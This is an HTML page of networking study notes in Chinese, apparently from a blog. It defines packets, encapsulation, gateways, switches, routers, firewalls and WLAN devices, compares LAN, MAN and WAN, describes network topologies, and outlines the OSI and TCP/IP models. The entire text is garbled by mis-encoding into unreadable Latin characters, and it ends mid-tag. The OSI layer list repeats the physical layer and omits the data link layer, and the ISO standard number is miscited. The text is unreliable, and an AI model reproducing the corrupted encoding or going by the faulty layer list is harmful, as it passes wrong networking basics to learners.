</p><p>â€¢ æŠ¥æ–‡ï¼šç½‘ç»œä¸­äº¤æ¢ä¸ä¼ è¾“çš„æ•°æ®å•å…ƒï¼Œå…·æœ‰ä¸€å®šçš„å†…åœ¨æ ¼å¼ï¼Œé€šå¸¸éƒ½å…·æœ‰å¤´éƒ¨+æ•°æ®è½½è·+ å°¾éƒ¨çš„åŸºæœ¬ç»“æ„ã€‚ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒæŠ¥æ–‡çš„æ ¼å¼å’Œå†…å®¹å¯èƒ½å‘ç”Ÿæ”¹å˜ã€‚ </p><p>â€¢ å¤´éƒ¨ï¼šä¸ºäº†æ›´å¥½çš„ä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç»„è£…æŠ¥æ–‡æ—¶ï¼Œåœ¨æ•°æ®è½½è·çš„å‰é¢æ·»åŠ çš„ä¿¡æ¯æ®µç»Ÿç§°ä¸ºæŠ¥æ–‡ çš„å¤´éƒ¨ã€‚ </p><p>â€¢ å°¾éƒ¨ï¼šä¸ºäº†æ›´å¥½çš„ä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç»„è£…æŠ¥æ–‡æ—¶ï¼Œåœ¨æ•°æ®è½½è·çš„åé¢æ·»åŠ çš„ä¿¡æ¯æ®µç»Ÿç§°ä¸ºæŠ¥æ–‡ çš„å°¾éƒ¨ã€‚æ³¨æ„ï¼Œå¾ˆå¤šæŠ¥æ–‡æ˜¯æ²¡æœ‰å°¾éƒ¨çš„ã€‚</p><p>â€¢ å°è£…ï¼šåˆ†å±‚åè®®æ‰€é‡‡ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œåº•å±‚åè®®æ”¶åˆ°æ¥è‡ªä¸Šå±‚åè®®çš„æ¶ˆæ¯æ—¶ï¼Œå°†è¯¥æ¶ˆæ¯é™„åŠ  åˆ°åº•å±‚å¸§çš„æ•°æ®éƒ¨åˆ†ã€‚ â€¢ è§£å°è£…ï¼šæ˜¯å°è£…çš„é€†è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯å»æ‰æŠ¥æ–‡çš„å¤´éƒ¨å’Œå°¾éƒ¨ï¼Œè·å–æ•°æ®è½½è·çš„è¿‡ç¨‹ã€‚</p><p>â€¢ ç½‘å…³ï¼šæ˜¯åœ¨é‡‡ç”¨ä¸åŒä½“ç³»ç»“æ„æˆ–åè®®çš„ç½‘ç»œä¹‹é—´è¿›è¡Œäº’é€šæ—¶ï¼Œç”¨äºæä¾›åè®®è½¬æ¢ã€è·¯ç”±é€‰ æ‹©ã€æ•°æ®äº¤æ¢ç­‰åŠŸèƒ½çš„ç½‘ç»œè®¾å¤‡ã€‚ç½‘å…³æ˜¯ä¸€ç§æ ¹æ®å…¶éƒ¨ç½²ä½ç½®å’ŒåŠŸèƒ½è€Œå‘½åçš„æœ¯è¯­ï¼Œè€Œä¸ æ˜¯ä¸€ç§ç‰¹å®šçš„è®¾å¤‡ç±»å‹ã€‚</p><p>â€¢ è·¯ç”±å™¨ï¼šä¸ºæŠ¥æ–‡é€‰æ‹©ä¼ é€’è·¯å¾„çš„ç½‘ç»œè®¾å¤‡ã€‚ </p><p>â€¢ ç»ˆç«¯è®¾å¤‡ï¼šæ•°æ®é€šä¿¡ç³»ç»Ÿçš„ç«¯è®¾å¤‡ï¼Œä½œä¸ºæ•°æ®çš„å‘é€è€…æˆ–æ¥æ”¶è€…ï¼Œæä¾›ç”¨æˆ·æ¥å…¥åè®®æ“ä½œ æ‰€éœ€å¿…è¦åŠŸèƒ½ï¼Œå¯ä»¥æ˜¯è®¡ç®—æœºã€æœåŠ¡å™¨ã€VoIPã€æ‰‹æœºç­‰ã€‚</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>æ•°æ®é€šä¿¡ç½‘ç»œï¼š</strong>ç”±è·¯ç”±å™¨ï¼Œäº¤æ¢æœºï¼Œé˜²ç«å¢™ï¼Œæ— çº¿æ§åˆ¶å™¨ï¼Œæ— çº¿æ¥å…¥ç‚¹ï¼Œä»¥åŠä¸ªäººç”µè„‘ï¼Œç½‘ç»œæ‰“å°æœºï¼ŒæœåŠ¡å™¨ç­‰è®¾å¤‡æ„æˆçš„é€šä¿¡ç½‘ç»œã€‚</p><p><strong>åŠŸèƒ½ï¼š</strong>å®ç°æ•°æ®äº’é€š</p><h2 id="ç½‘ç»œè®¾å¤‡"><a href="#ç½‘ç»œè®¾å¤‡" class="headerlink" title="ç½‘ç»œè®¾å¤‡"></a>ç½‘ç»œè®¾å¤‡</h2><p><strong>äº¤æ¢æœºï¼š</strong>è·ç¦»ç»ˆç«¯ç”¨æˆ·æœ€è¿‘çš„è®¾å¤‡ï¼Œç”¨äºç»ˆç«¯ç”¨æˆ·æ¥å…¥ç½‘ç»œã€å¯¹æ•°æ®å¸§è¿›è¡Œäº¤æ¢</p><ul><li>ç»ˆç«¯è®¾å¤‡ï¼ˆpcï¼ŒæœåŠ¡å™¨ç­‰ï¼‰çš„ç½‘ç»œæ¥å…¥</li><li>äºŒå±‚äº¤æ¢</li></ul><p>åœ¨å›­åŒºç½‘ç»œä¸­ï¼Œäº¤æ¢æœºä¸€èˆ¬æ¥è¯´æ˜¯è·ç¦»ç»ˆç«¯ç”¨æˆ·æœ€è¿‘çš„è®¾å¤‡ï¼Œæ¥å…¥å±‚çš„äº¤æ¢æœºä¸€èˆ¬ä¸º <strong>äºŒå±‚äº¤æ¢æœº</strong>ï¼Œåˆç§°ä¸º<strong>ä»¥å¤ªç½‘äº¤æ¢æœº</strong>ï¼ŒäºŒå±‚æ˜¯æŒ‡<strong>TCP/IPå‚è€ƒæ¨¡å‹çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼› </p><p>ä»¥å¤ªç½‘äº¤æ¢æœºå¯ä»¥å®ç°ï¼š<strong>æ•°æ®å¸§çš„äº¤æ¢</strong>ã€<strong>ç»ˆç«¯ç”¨æˆ·è®¾å¤‡çš„æ¥å…¥</strong>ã€<strong>åŸºæœ¬çš„æ¥å…¥å®‰å…¨åŠŸèƒ½</strong>ã€ <strong>äºŒå±‚é“¾è·¯çš„å†—ä½™</strong>ç­‰ï¼› </p><p>å¹¿æ’­åŸŸï¼šä¸€ä¸ªèŠ‚ç‚¹å‘é€ä¸€ä¸ªå¹¿æ’­æŠ¥æ–‡å…¶ä½™èŠ‚ç‚¹éƒ½èƒ½å¤Ÿæ”¶åˆ°çš„èŠ‚ç‚¹çš„é›†åˆ</p><p><strong>è·¯ç”±å™¨ï¼š</strong>ç½‘ç»œå±‚è®¾å¤‡ï¼Œå¯ä»¥åœ¨å› ç‰¹ç½‘ä¸­è¿›è¡Œæ•°æ®çš„è½¬å‘</p><ul><li>å®ç°åŒç±»å‹ç½‘ç»œæˆ–å¼‚ç§ç½‘ç»œä¹‹é—´çš„é€šä¿¡</li><li>éš”ç¦»å¹¿æ’­åŸŸ</li><li>ç»´æŠ¤è·¯ç”±è¡¨ã€è¿è¡Œè·¯ç”±åè®®</li><li>è·¯å¾„ï¼ˆè·¯ç”±ä¿¡æ¯ï¼‰é€‰æ‹©ã€IPæŠ¥æ–‡çš„è½¬å‘</li><li>å¹¿åŸŸç½‘æ¥å…¥ã€ç½‘ç»œåœ°å€è½¬æ¢</li><li>è¿æ¥é€šè¿‡äº¤æ¢æœºç»„å»ºçš„äºŒå±‚ç½‘ç»œ</li></ul><p>è·¯ç”±å™¨å·¥ä½œåœ¨TCP/IPå‚è€ƒæ¨¡å‹çš„ç½‘ç»œå±‚ï¼› è·¯ç”±å™¨å¯ä»¥å®ç°ï¼šç»´æŠ¤è·¯ç”±è¡¨å’Œè·¯ç”±ä¿¡æ¯ã€è·¯ç”±å‘ç°åŠè·¯å¾„   é€‰æ‹©ã€æ•°æ®è½¬å‘ã€éš”ç¦»å¹¿ æ’­åŸŸã€å¹¿åŸŸç½‘æ¥å…¥å’Œç½‘ç»œåœ°å€è½¬æ¢åŠç‰¹å®šçš„å®‰å…¨åŠŸèƒ½</p><p><strong>é˜²ç«å¢™</strong>ï¼šç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œç”¨äºæ§åˆ¶ä¸¤ä¸ªç½‘ç»œä¹‹é—´çš„å®‰å…¨é€šä¿¡ã€‚é€šè¿‡ç›‘æµ‹ã€é™åˆ¶ã€æ›´æ”¹è·¨è¶Šé˜²ç«å¢™çš„æ•°æ®æµï¼Œå°½å¯èƒ½åœ°å¯¹å¤–éƒ¨å±è”½ç½‘ç»œå†…éƒ¨çš„ä¿¡æ¯ã€ç»“æ„å’Œè¿è¡ŒçŠ¶å†µï¼Œä»¥æ­¤æ¥å®ç°å¯¹ç½‘ç»œçš„å®‰å…¨ä¿æŠ¤</p><ul><li>éš”ç¦»ä¸åŒå®‰å…¨çº§åˆ«çš„ç½‘ç»œ</li><li>å®ç°ä¸åŒå®‰å…¨çº§åˆ«çš„ç½‘ç»œä¹‹é—´çš„è®¿é—®æ§åˆ¶ï¼ˆå®‰å…¨ç­–ç•¥ï¼‰</li><li>ç”¨æˆ·èº«ä»½è®¤çœŸ</li><li>å®ç°è¿œç¨‹æ¥å…¥åŠŸèƒ½</li><li>å®ç°æ•°æ®åŠ å¯†åŠè™šæ‹Ÿä¸“ç”¨ç½‘ä¸šåŠ¡</li><li>æ‰§è¡Œç½‘ç»œåœ°å€è½¬æ¢</li><li>å…¶ä»–å®‰å…¨åŠŸèƒ½</li></ul><p>æ˜¯ä½äºä¸¤ä¸ªä¿¡ä»»ç¨‹åº¦ä¸åŒçš„ç½‘ç»œä¹‹é—´ï¼ˆå¦‚ä¼ä¸šå†…éƒ¨ç½‘ç»œå’ŒInternetä¹‹é—´ï¼‰çš„è®¾å¤‡ï¼Œå®ƒ å¯¹ä¸¤ä¸ªç½‘ç»œä¹‹é—´çš„é€šä¿¡è¿›è¡Œæ§åˆ¶ï¼Œé€šè¿‡å¼ºåˆ¶å®æ–½ç»Ÿä¸€çš„å®‰å…¨ç­–ç•¥ï¼Œé˜²æ­¢å¯¹é‡è¦ä¿¡æ¯èµ„ æºçš„éæ³•å­˜å–å’Œè®¿é—®ï¼Œä»¥è¾¾åˆ°ä¿æŠ¤ç³»ç»Ÿå®‰å…¨çš„ç›®çš„ã€‚</p><p><strong>æ— çº¿ç½‘ç»œï¼š</strong></p><ul><li><p>â€‹    æ— çº¿å±€åŸŸç½‘WLANå¹¿ä¹‰ä¸Šæ˜¯æŒ‡ä»¥æ— çº¿ç”µæ³¢ã€æ¿€å…‰ã€çº¢å¤–çº¿ç­‰æ— çº¿ä¿¡å·æ¥ä»£æ›¿æœ‰çº¿å±€åŸŸç½‘ä¸­ çš„éƒ¨åˆ†æˆ–å…¨éƒ¨ä¼ è¾“ä»‹è´¨æ‰€æ„æˆçš„ç½‘ç»œã€‚è€Œå¸¸è§çš„Wi-Fiæ˜¯æŒ‡IEEE 802.11æ ‡å‡†ä¸Šçš„æ— çº¿å±€åŸŸç½‘ æŠ€æœ¯ã€‚</p></li><li><p>â€‹    åœ¨WLANä¸­ï¼Œå¸¸è§çš„è®¾å¤‡æœ‰èƒ–APã€ç˜¦APå’Œæ— çº¿æ§åˆ¶å™¨ACã€‚ </p><ul><li><p>æ— çº¿æ¥å…¥ç‚¹ (AP, Access Pointï¼‰</p><ul><li>â€‹    ä¸€èˆ¬æ”¯æŒFAT APã€FIT APå’Œäº‘ç®¡ç†å·¥ä½œæ¨¡å¼ï¼Œæ ¹æ®ç½‘ç»œè§„åˆ’çš„éœ€æ±‚ï¼Œå¯ä»¥çµæ´»åœ°åœ¨å„ç§æ¨¡å¼ä¸‹åˆ‡æ¢ã€‚</li><li>â€‹    FAT APï¼šé€‚ç”¨äºå®¶åº­ï¼Œç‹¬ç«‹å·¥ä½œï¼Œéœ€å•ç‹¬é…ç½®ï¼ŒåŠŸèƒ½è¾ƒä¸ºå•ä¸€ï¼Œæˆæœ¬ä½ã€‚</li><li>â€‹    FIT APï¼šé€‚ç”¨äºå¤§ä¸­å‹ä¼ä¸šï¼Œéœ€è¦é…åˆACä½¿ç”¨ï¼Œç”±ACç»Ÿä¸€ç®¡ç†å’Œé…ç½®ï¼ŒåŠŸèƒ½ä¸°å¯Œã€‚</li><li>â€‹    äº‘ç®¡ç†ï¼šé€‚ç”¨äºä¸­å°å‹ä¼ä¸šï¼Œéœ€è¦é…åˆäº‘ç®¡ç†å¹³å°ä½¿ç”¨ï¼Œç”±äº‘ç®¡ç†å¹³å°ç»Ÿä¸€ç®¡<br>ç†å’Œé…ç½®ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œå³æ’å³ç”¨ã€‚</li></ul></li><li><p>æ— çº¿æ¥å…¥æ§åˆ¶å™¨ (AC, Access Controller) </p><ul><li>â€‹    ä¸€èˆ¬ä½äºæ•´ä¸ªç½‘ç»œçš„æ±‡èšå±‚ï¼Œæä¾›é«˜é€Ÿã€å®‰å…¨ã€å¯é çš„WLANä¸šåŠ¡ã€‚ </li><li>â€‹    æä¾›å¤§å®¹é‡ã€é«˜æ€§èƒ½ã€é«˜å¯é æ€§ã€æ˜“å®‰è£…ã€æ˜“ç»´æŠ¤çš„æ— çº¿æ•°æ®æ§åˆ¶ä¸šåŠ¡ï¼Œå…·æœ‰ ç»„ç½‘çµæ´»ã€ç»¿è‰²èŠ‚èƒ½ç­‰ä¼˜åŠ¿</li></ul></li></ul></li></ul><h2 id="å±€åŸŸç½‘ã€åŸåŸŸç½‘ã€å¹¿åŸŸç½‘"><a href="#å±€åŸŸç½‘ã€åŸåŸŸç½‘ã€å¹¿åŸŸç½‘" class="headerlink" title="å±€åŸŸç½‘ã€åŸåŸŸç½‘ã€å¹¿åŸŸç½‘"></a><strong>å±€åŸŸç½‘ã€åŸåŸŸç½‘ã€å¹¿åŸŸç½‘</strong></h2><p>å±€åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´åœ¨å‡ å…¬é‡Œä¹‹å†…ã€‚ä¸»è¦ä½œç”¨æ˜¯æŠŠåˆ†å¸ƒè¾ƒè¿‘çš„è‹¥å¹²ç»ˆç«¯ç”µè„‘è¿æ¥èµ·æ¥ï¼Œä½¿ç”¨ä»¥å¤ªç½‘ã€wi-fiç­‰æŠ€æœ¯</p><p>åŸåŸŸç½‘ï¼šè¾ƒå¤§å‹çš„å±€åŸŸç½‘ï¼Œæˆæœ¬é«˜ï¼Œä¼ è¾“é€Ÿç‡å¿«ã€‚æ”¹è¿›äº†å±€åŸŸç½‘çš„ä¼ è¾“ä»‹è´¨ï¼Œæ‰©å¤§äº†è®¿é—®èŒƒå›´ã€‚ä¸»è¦ä½œç”¨æ˜¯å°†åŒä¸€åŸå¸‚å†…ä¸åŒåœ°ç‚¹çš„ä¸»æœºã€æ•°æ®åº“ä»¥åŠå±€åŸŸç½‘ç­‰è¿æ¥èµ·æ¥ï¼›ä¸å¹¿åŸŸç½‘ä½œç”¨ç›¸ä¼¼ï¼Œä½†å®ç°æ–¹å¼å’Œæ€§èƒ½ä¸åŒã€‚åŸºäºå¤§å‹çš„å±€åŸŸç½‘ï¼Œä¸å±€åŸŸç½‘æŠ€æœ¯ç›¸ä¼¼ï¼Œå¦‚ï¼šä»¥å¤ªç½‘ (10Gbps/100Gbps)ã€ WiMAX (å…¨çƒäº’é€šå¾®æ³¢è®¿é—®)</p><p>å¹¿åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´ä¸€èˆ¬åœ¨å‡ å…¬é‡Œä»¥ä¸Šï¼Œå¯å¤§è‡³å‡ åã€å‡ ç™¾æˆ–å‡ åƒå…¬é‡Œã€‚ä¸»è¦ä½œç”¨æ˜¯æŠŠåˆ†å¸ƒè¾ƒè¿œ (å¦‚: è·¨è¶ŠåŸå¸‚ã€è·¨è¶Šå›½å®¶ï¼Œ ç­‰ç­‰) çš„è‹¥å¹²å±€åŸŸç½‘æˆ–åŸåŸŸ ç½‘è¿æ¥èµ·æ¥ï¼›ä¼šç”¨åˆ°ç”µä¿¡è¿è¥å•†çš„é€šä¿¡çº¿è·¯ã€‚ä½¿ç”¨HDLCã€PPPç­‰æŠ€æœ¯</p><h2 id="ç½‘ç»œæ‹“æ‰‘"><a href="#ç½‘ç»œæ‹“æ‰‘" class="headerlink" title="ç½‘ç»œæ‹“æ‰‘"></a>ç½‘ç»œæ‹“æ‰‘</h2><p>æ˜¯æŒ‡ç”¨ä¼ è¾“ä»‹è´¨ï¼ˆå¦‚åŒç»çº¿ã€å…‰çº¤ç­‰ï¼‰äº’è”å„ç§è®¾å¤‡æ‰€å‘ˆç°çš„ç»“æ„åŒ–å¸ƒå±€ã€‚</p><p><strong>å½¢æ€</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124181356966.png" alt="image-20220124181356966"></p><p>æ˜Ÿå‹ç½‘ç»œï¼š</p><ul><li>æ‰€æœ‰èŠ‚ç‚¹é€šè¿‡ä¸€ä¸ªä¸­å¿ƒèŠ‚ç‚¹è¿æ¥åœ¨ä¸€èµ·ã€‚</li><li>ä¼˜ç‚¹ï¼šå®¹æ˜“åœ¨ç½‘ç»œä¸­å¢åŠ æ–°çš„èŠ‚ç‚¹ã€‚é€šä¿¡æ•°æ®å¿…é¡»ç»è¿‡ä¸­å¿ƒèŠ‚ç‚¹ä¸­è½¬ï¼Œæ˜“äºå®ç°ç½‘ç»œ ç›‘æ§ã€‚</li><li>ç¼ºç‚¹ï¼šä¸­å¿ƒèŠ‚ç‚¹çš„æ•…éšœä¼šå½±å“åˆ°æ•´ä¸ªç½‘ç»œçš„é€šä¿¡ã€‚</li></ul><p>æ€»çº¿å‹ç½‘ç»œï¼š</p><ul><li>æ‰€æœ‰èŠ‚ç‚¹é€šè¿‡ä¸€æ¡æ€»çº¿ï¼ˆå¦‚åŒè½´ç”µç¼†ï¼‰è¿æ¥åœ¨ä¸€èµ·ã€‚</li><li>ä¼˜ç‚¹ï¼šå®‰è£…ç®€ä¾¿ï¼ŒèŠ‚çœçº¿ç¼†ã€‚æŸä¸€èŠ‚ç‚¹çš„æ•…éšœä¸€èˆ¬ä¸ä¼šå½±å“åˆ°æ•´ä¸ªç½‘ç»œçš„é€šä¿¡ã€‚</li><li>ç¼ºç‚¹ï¼šæ€»çº¿æ•…éšœä¼šå½±å“åˆ°æ•´ä¸ªç½‘ç»œçš„é€šä¿¡ã€‚æŸä¸€èŠ‚ç‚¹å‘å‡ºçš„ä¿¡æ¯å¯ä»¥è¢«æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹ æ”¶åˆ°ï¼Œå®‰å…¨æ€§ä½ã€‚</li></ul><p>ç¯å½¢ç½‘ç»œï¼š</p><ul><li>æ‰€æœ‰èŠ‚ç‚¹è¿æˆä¸€ä¸ªå°é—­çš„ç¯å½¢ã€‚</li><li>ä¼˜ç‚¹ï¼šèŠ‚çœçº¿ç¼†ã€‚</li><li>ç¼ºç‚¹ï¼šå¢åŠ æ–°çš„èŠ‚ç‚¹æ¯”è¾ƒéº»çƒ¦ï¼Œå¿…é¡»å…ˆä¸­æ–­åŸæ¥çš„ç¯ï¼Œæ‰èƒ½æ’å…¥æ–°èŠ‚ç‚¹ä»¥å½¢æˆæ–°ç¯ã€‚</li></ul><p>æ ‘å½¢ç½‘ç»œï¼š</p><ul><li>æ ‘å‹ç»“æ„å®é™…ä¸Šæ˜¯ä¸€ç§å±‚æ¬¡åŒ–çš„æ˜Ÿå‹ç»“æ„ã€‚</li><li>ä¼˜ç‚¹ï¼šèƒ½å¤Ÿå¿«é€Ÿå°†å¤šä¸ªæ˜Ÿå‹ç½‘ç»œè¿æ¥åœ¨ä¸€èµ·ï¼Œæ˜“äºæ‰©å……ç½‘ç»œè§„æ¨¡ã€‚</li><li>ç¼ºç‚¹ï¼šå±‚çº§è¶Šé«˜çš„èŠ‚ç‚¹æ•…éšœå¯¼è‡´çš„ç½‘ç»œé—®é¢˜è¶Šä¸¥é‡</li></ul><p>å…¨ç½‘çŠ¶ç½‘ç»œï¼š</p><ul><li>æ‰€æœ‰èŠ‚ç‚¹éƒ½é€šè¿‡çº¿ç¼†ä¸¤ä¸¤äº’è”ã€‚</li><li>ä¼˜ç‚¹ï¼šå…·æœ‰é«˜å¯é æ€§å’Œé«˜é€šä¿¡æ•ˆç‡ã€‚</li><li>ç¼ºç‚¹ï¼šæ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦å¤§é‡çš„ç‰©ç†ç«¯å£ï¼ŒåŒæ—¶è¿˜éœ€è¦å¤§é‡çš„äº’è¿çº¿ç¼†ã€‚æˆæœ¬é«˜ï¼Œä¸æ˜“ æ‰©å±•ã€‚</li></ul><p>éƒ¨åˆ†ç½‘çŠ¶ç½‘ç»œï¼š</p><ul><li>åªæ˜¯é‡ç‚¹èŠ‚ç‚¹ä¹‹é—´æ‰ä¸¤ä¸¤äº’è¿ã€‚</li><li>ä¼˜ç‚¹ï¼šæˆæœ¬ä½äºå…¨ç½‘çŠ¶ç½‘ç»œã€‚</li><li>ç¼ºç‚¹ï¼šå¯é æ€§æ¯”å…¨ç½‘çŠ¶ç½‘ç»œæœ‰æ‰€é™ä½ã€‚</li></ul><p> åœ¨å®é™…ç»„ç½‘ä¸­ï¼Œé€šå¸¸éƒ½ä¼šæ ¹æ®æˆæœ¬ã€é€šä¿¡æ•ˆç‡ã€å¯é æ€§ç­‰å…·ä½“éœ€æ±‚è€Œé‡‡ç”¨å¤šç§æ‹“æ‰‘å½¢æ€ç›¸ ç»“åˆçš„æ–¹æ³•ã€‚</p><h2 id="ç½‘ç»œå·¥ç¨‹"><a href="#ç½‘ç»œå·¥ç¨‹" class="headerlink" title="ç½‘ç»œå·¥ç¨‹"></a>ç½‘ç»œå·¥ç¨‹</h2><p>ç½‘ç»œå·¥ç¨‹ï¼Œå°±æ˜¯å›´ç»•ç€ç½‘ç»œè¿›è¡Œçš„ä¸€ç³»åˆ—çš„æ´»åŠ¨ï¼ŒåŒ…æ‹¬ï¼šç½‘ç»œè§„åˆ’ã€è®¾è®¡ã€å®æ–½ã€è°ƒè¯•ã€ æ’é”™ç­‰ã€‚</p><p>ç½‘ç»œå·¥ç¨‹è®¾è®¡çš„çŸ¥è¯†é¢†åŸŸå¾ˆå®½å¹¿ï¼Œå…¶ä¸­è·¯ç”±å’Œäº¤æ¢æ˜¯è®¡ç®—æœºç½‘ç»œçš„åŸºæœ¬</p><p>ç½‘ç»œå·¥ç¨‹å¸ˆï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124182016579.png" alt="image-20220124182016579"></p><h1 id="ç½‘ç»œå‚è€ƒæ¨¡å‹"><a href="#ç½‘ç»œå‚è€ƒæ¨¡å‹" class="headerlink" title="ç½‘ç»œå‚è€ƒæ¨¡å‹"></a>ç½‘ç»œå‚è€ƒæ¨¡å‹</h1><h2 id="åº”ç”¨å’Œæ•°æ®"><a href="#åº”ç”¨å’Œæ•°æ®" class="headerlink" title="åº”ç”¨å’Œæ•°æ®"></a>åº”ç”¨å’Œæ•°æ®</h2><p><strong>åº”ç”¨ï¼š</strong>åº”ç”¨çš„å­˜åœ¨æ˜¯ä¸ºäº†æ»¡è¶³äººä»¬çš„å„ç§éœ€æ±‚ï¼Œä¼´éšç€åº”ç”¨ä¼šæœ‰ä¿¡æ¯çš„äº§ç”Ÿã€‚æ¯”å¦‚æ–‡æœ¬ï¼Œå›¾ç‰‡ï¼Œè§†é¢‘ç­‰éƒ½æ˜¯ä¿¡æ¯çš„ä¸åŒå‘ˆç°æ–¹å¼</p><p><strong>æ•°æ®ï¼š</strong>æ•°æ®æ˜¯å„ç§ä¿¡æ¯çš„è½½ä½“ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºæ‰€äº§ç”Ÿçš„æ•°æ®éœ€è¦åœ¨ä¸åŒçš„è®¾å¤‡ä¹‹é—´ä¼ é€’ã€‚</p><p>â€¢ è®¡ç®—æœºåªèƒ½è¯†åˆ«0å’Œ1çš„ç»„æˆçš„ç”µå­æ•°æ®(digital data)ã€‚å®ƒä¸å…·å¤‡è¯»å–å„ç§ä¿¡æ¯çš„èƒ½åŠ›ï¼Œæ‰€ ä»¥ä¿¡æ¯éœ€è¦é€šè¿‡ä¸€å®šçš„è§„åˆ™ç¿»è¯‘æˆæ•°æ®ã€‚ </p><p>â€¢ è€Œå¯¹äººæ¥è¯´ï¼Œæˆ‘ä»¬ä¸å…·å¤‡è¯»å–ç”µå­æ•°æ®çš„èƒ½åŠ›ï¼Œæ‰€ä»¥åœ¨è¯»å–ä¿¡æ¯çš„æ—¶å€™ï¼Œéœ€è¦å°†æ•°æ®è½¬æˆ äººèƒ½ç†è§£çš„ä¿¡æ¯ã€‚ </p><p>â€¢ å¯¹äºä¸€åç½‘ç»œå·¥ç¨‹å¸ˆæ¥è¯´ï¼Œéœ€è¦æ›´å…³æ³¨æ•°æ®çš„ç«¯åˆ°ç«¯ä¼ é€’çš„è¿‡ç¨‹ã€‚</p><h2 id="OSIå‚è€ƒæ¨¡å‹"><a href="#OSIå‚è€ƒæ¨¡å‹" class="headerlink" title="OSIå‚è€ƒæ¨¡å‹"></a>OSIå‚è€ƒæ¨¡å‹</h2><p> OSI æ¨¡å‹(Open Systems Interconnection Model)ï¼Œç”±å›½é™…åŒ–æ ‡å‡†ç»„ç»‡ISO (The  International Organization for Standardization ) æ”¶å½•åœ¨ISO 7489æ ‡å‡†ä¸­å¹¶äº1984å¹´å‘å¸ƒã€‚</p><p>OSIå‚è€ƒæ¨¡å‹åˆè¢«ç§°ä¸ºä¸ƒå±‚æ¨¡å‹ï¼Œç”±ä¸‹è‡³ä¸Šä¾æ¬¡ä¸ºï¼š</p><ul><li>ç‰©ç†å±‚ï¼šåœ¨è®¾å¤‡ä¹‹é—´ä¼ è¾“æ¯”ç‰¹æµï¼Œè§„å®šäº†ç”µå¹³ã€é€Ÿåº¦å’Œç”µç¼†é’ˆè„šç­‰ç‰©ç†ç‰¹æ€§ã€‚</li><li>ç‰©ç†å±‚ï¼šåœ¨è®¾å¤‡ä¹‹é—´ä¼ è¾“æ¯”ç‰¹æµï¼Œè§„å®šäº†ç”µå¹³ã€é€Ÿåº¦å’Œç”µç¼†é’ˆè„šç­‰ç‰©ç†ç‰¹æ€§ã€‚</li><li>ç½‘ç»œå±‚ï¼šå®šä¹‰é€»è¾‘åœ°å€ï¼Œä¾›è·¯ç”±å™¨ç¡®å®šè·¯å¾„ï¼Œè´Ÿè´£å°†æ•°æ®ä»æºç½‘ç»œä¼ è¾“åˆ°ç›®çš„ç½‘ç»œã€‚</li><li>ä¼ è¾“å±‚ï¼šæä¾›é¢å‘è¿æ¥æˆ–éé¢å‘è¿æ¥çš„æ•°æ®ä¼ é€’ä»¥åŠè¿›è¡Œé‡ä¼ å‰çš„å·®é”™æ£€æµ‹ã€‚</li><li>ä¼šè¯å±‚ï¼šè´Ÿè´£å»ºç«‹ã€ç®¡ç†å’Œç»ˆæ­¢è¡¨ç¤ºå±‚å®ä½“ä¹‹é—´çš„é€šä¿¡ä¼šè¯ã€‚è¯¥å±‚çš„é€šä¿¡ç”±ä¸åŒè®¾å¤‡ ä¸­çš„åº”ç”¨ç¨‹åºä¹‹é—´çš„æœåŠ¡è¯·æ±‚å’Œå“åº”ç»„æˆã€‚</li><li>è¡¨ç¤ºå±‚ï¼šæä¾›å„ç§ç”¨äºåº”ç”¨å±‚æ•°æ®çš„ç¼–ç å’Œè½¬æ¢åŠŸèƒ½ï¼Œç¡®ä¿ä¸€ä¸ªç³»ç»Ÿçš„åº”ç”¨å±‚å‘é€çš„ æ•°æ®èƒ½è¢«å¦ä¸€ä¸ªç³»ç»Ÿçš„åº”ç”¨å±‚è¯†åˆ«ã€‚</li><li>åº”ç”¨å±‚ï¼šOSIå‚è€ƒæ¨¡å‹ä¸­æœ€é è¿‘ç”¨æˆ·çš„ä¸€å±‚ï¼Œä¸ºåº”ç”¨ç¨‹åºæä¾›ç½‘ç»œæœåŠ¡ã€‚</li></ul><h2 id="TCP-IPå‚è€ƒæ¨¡å‹"><a href="#TCP-IPå‚è€ƒæ¨¡å‹" class="headerlink" title="TCP/IPå‚è€ƒæ¨¡å‹"></a>TCP/IPå‚è€ƒæ¨¡å‹</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124182840485.png" alt="image-20220124182840485"></p><p>ç»“æ„ä¸Šä¸OSIæ¨¡å‹ç±»ä¼¼ï¼Œé‡‡ç”¨åˆ†å±‚æ¶æ„ï¼ŒåŒæ—¶å±‚ä¸å±‚ä¹‹é—´è”ç³»ç´§å¯†ã€‚</p><p>TCP/IPæ ‡å‡†å‚è€ƒæ¨¡å‹å°†OSIä¸­çš„æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚åˆå¹¶ä¸ºç½‘ç»œæ¥å…¥å±‚ï¼Œè¿™ç§åˆ’åˆ†æ–¹å¼å…¶å® æ˜¯æœ‰æ‚–äºç°å®åè®®åˆ¶å®šæƒ…å†µçš„ï¼Œæ•…èåˆäº†TCP/IPæ ‡å‡†æ¨¡å‹å’ŒOSIæ¨¡å‹çš„TCP/IPå¯¹ç­‰æ¨¡å‹è¢«æå‡º</p><h2 id="TCP-IPå¸¸è§åè®®"><a href="#TCP-IPå¸¸è§åè®®" class="headerlink" 